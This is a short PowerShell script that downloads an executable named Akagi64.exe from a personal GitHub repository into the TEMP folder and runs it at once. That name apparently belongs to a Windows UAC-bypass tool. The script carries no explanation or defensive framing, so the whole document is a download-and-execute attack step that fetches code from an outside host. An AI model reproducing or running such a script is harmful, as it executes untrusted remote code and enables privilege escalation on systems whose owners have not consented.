$exe = Join-Path $env:TEMP 'Akagi64.exe'
Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/Akagi64.exe' -OutFile $exe -UseBasicParsing
Start-Process $exe
